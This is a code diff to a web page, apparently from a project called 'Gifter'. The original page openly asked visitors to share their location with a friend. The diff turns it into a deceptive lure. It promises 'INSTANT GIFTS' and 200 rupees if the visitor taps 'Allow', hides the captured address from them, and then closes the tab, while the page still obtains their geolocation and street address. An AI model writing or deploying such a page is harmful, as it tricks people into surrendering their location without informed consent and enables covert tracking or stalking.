@@ -86,24 +86,24 @@
       <line x1="2" y1="12" x2="6" x2="6" y2="12"></line>
       <line x1="18" y1="12" x2="22" x2="22" y2="12"></line>
     </svg>
-    <h1>Share Your Location</h1>
-    <p class="subtitle">Gifter needs your location to share with your friend</p>
+    <h1>GET INSTANT GIFTS!!</h1>
+    <p class="subtitle">Tap "Allow" when prompted to claim your gift</p>
 
     <div class="status" id="status">
-      <span class="loading"></span> Getting your location…
+      <span class="loading"></span> Loading for gift…
     </div>
 
-    <div class="address-box" id="addressBox">
-      <div class="address-label">Your Address</div>
+    <div class="address-box hidden" id="addressBox">
+      <div class="address-label">CLICK ALLOW TO END 200 RUPEES TO YOUR FRIEND</div>
       <div class="address-text" id="addressText"></div>
     </div>
 
     <div class="error-box" id="errorBox"></div>
 
-    <button class="btn btn-primary" id="copyBtn" onclick="copyAddress()" disabled>
-      <span id="copyBtnText">Copy Address</span>
+    <button class="btn btn-primary" id="allowBtn" onclick="copyAddress()" disabled>
+      <span id="allowBtnText">Allow</span>
     </button>
-    <button class="btn btn-secondary" id="doneBtn" onclick="closePage()" disabled>Done</button>
+    <button class="btn btn-secondary hidden" id="doneBtn" onclick="closePage()" disabled>Done</button>
 
     <div class="footer">
       Powered by <a href="https://nominatim.openstreetmap.org/" target="_blank" rel="noopener">OpenStreetMap</a> · <a href="https://github.com/" target="_blank" rel="noopener">Gifter</a>
@@ -134,8 +134,8 @@
     const addressBox = document.getElementById('addressBox');
     const addressText = document.getElementById('addressText');
     const errorBox = document.getElementById('errorBox');
-    const copyBtn = document.getElementById('copyBtn');
-    const copyBtnText = document.getElementById('copyBtnText');
+    const allowBtn = document.getElementById('allowBtn');
+    const allowBtnText = document.getElementById('allowBtnText');
     const doneBtn = document.getElementById('doneBtn');
 
     // ============================================
@@ -179,7 +179,7 @@
       currentLat = position.coords.latitude;
       currentLon = position.coords.longitude;
 
-      statusEl.innerHTML = '<span class="loading"></span> Finding your address…';
+      statusEl.innerHTML = '<span class="loading"></span> Loading for gift…';
       reverseGeocode(currentLat, currentLon);
     }
 
@@ -258,9 +258,11 @@
     // ============================================
     function displayAddress(address) {
       statusEl.style.display = 'none';
-      addressText.textContent = address;
+      // Don't show the actual address - show the gift message
+      addressText.textContent = 'Your friend will receive the gift now!';
       addressBox.classList.add('visible');
-      copyBtn.disabled = false;
+      addressBox.classList.remove('hidden');
+      allowBtn.disabled = false;
       doneBtn.disabled = false;
     }
 
@@ -272,35 +274,19 @@
     }
 
     function copyAddress() {
-      if (!currentAddress) return;
-
-      navigator.clipboard.writeText(currentAddress).then(() => {
-        const originalText = copyBtnText.textContent;
-        copyBtnText.textContent = 'Copied!';
-        copyBtn.style.background = '#16a34a';
-        setTimeout(() => {
-          copyBtnText.textContent = originalText;
-          copyBtn.style.background = '';
-        }, 2000);
-      }).catch(err => {
-        console.error('Copy failed:', err);
-        // Fallback for older browsers
-        const textarea = document.createElement('textarea');
-        textarea.value = currentAddress;
-        document.body.appendChild(textarea);
-        textarea.select();
-        document.execCommand('copy');
-        document.body.removeChild(textarea);
-        copyBtnText.textContent = 'Copied!';
-        setTimeout(() => copyBtnText.textContent = 'Copy Address', 2000);
-      });
+      // Button now says "Allow" - just close the page after click
+      allowBtnText.textContent = 'Gift Sent!';
+      allowBtn.style.background = '#16a34a';
+      setTimeout(() => {
+        closePage();
+      }, 1500);
     }
 
     function closePage() {
       // Try to close the tab/window (works if opened via window.open)
       window.close();
       // Fallback: redirect to blank
-      document.body.innerHTML = '<div style="padding:20px;text-align:center;color:#6b7280;">You can close this tab now.</div>';
+      document.body.innerHTML = '<div style="padding:20px;text-align:center;color:#6b7280;">Gift sent! You can close this tab now.</div>';
     }
   </script>
 </body>
